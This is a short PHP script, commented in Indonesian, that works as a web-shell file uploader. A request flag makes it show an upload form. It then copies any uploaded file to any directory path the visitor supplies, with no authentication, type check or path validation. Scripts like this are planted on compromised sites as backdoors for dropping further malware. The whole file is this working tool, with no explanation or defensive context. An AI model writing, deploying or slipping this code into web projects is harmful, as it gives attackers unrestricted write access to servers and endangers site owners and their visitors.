<?php
    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
        // Tampilkan formulir unggah file
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
        echo '<input type="file" name="file" size="15">';
        echo '<input type="submit" value="Unggah">';
        echo '</form>';
    }
    
    if (isset($_FILES['file']['tmp_name'])) {
        // Tangani unggahan file jika formulir dikirimkan
        $uploadd = $_FILES['file']['tmp_name'];
        if (file_exists($uploadd)) {
            $pwddir = $_POST['dir'];
            $real = $_FILES['file']['name'];
            $de = $pwddir . "/" . $real;
            copy($uploadd, $de);
            echo "BERKAS DIUNGGAHKAN KE $de";
        }
    }
?>
